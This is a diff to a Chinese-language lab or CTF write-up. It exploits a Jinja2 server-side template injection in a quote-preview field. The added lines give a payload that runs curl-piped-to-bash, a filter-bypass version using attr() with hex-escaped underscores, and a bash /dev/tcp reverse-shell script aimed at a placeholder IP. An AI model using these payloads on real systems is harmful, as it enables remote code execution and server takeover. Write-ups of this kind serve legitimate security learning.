@@ -665,7 +665,7 @@ GenerateQR可以输入这个ID并提供报价单预览功能，而预览功能�
 ![[Pasted image 20240408173108.png]]
 QRlink是易受攻击的字段，点击submit预览报价单时可以发现SSTI被成功执行：
 ![[Pasted image 20240408173235.png]]
-fuzz以下参数，
+fuzz以下参数，大多被过滤
 ```
 <<<--- 500 error responses --->>>
 
@@ -701,4 +701,23 @@ fuzz以下参数，
 {{config}}
 
 ```
+在[A Simple Flask (Jinja2) Server-Side Template Injection (SSTI) Example --- 简单烧瓶 （Jinja2） 服务器端模板注入 （SSTI） 示例 (kleiber.me)](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)
+拿到了模板：
+```python
+{{request.application.__globals__.__builtins__.__import__('os').popen('curl IP/revshell | bash').read()}}
+```
+但是有过滤，大概率过滤了`'_#&;`字符
+使用attr及十六进制过滤模板:
+```python
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl IP:PORT/revshell | bash")|attr("read")()}}
+```
+`("os")|attr(popen) = os.open`
+请求我们服务器上的revshell文件并执行：
+```revshell
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
+```
+设置好监听器，发送请求，拿到了www-data的shell:
+![[Pasted image 20240408174326.png]]
+
 AboutSSTI:[SSTI (Server Side Template Injection) | HackTricks | HackTricks --- SSTI（服务器端模板注入） |黑客技巧 |黑客技巧](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
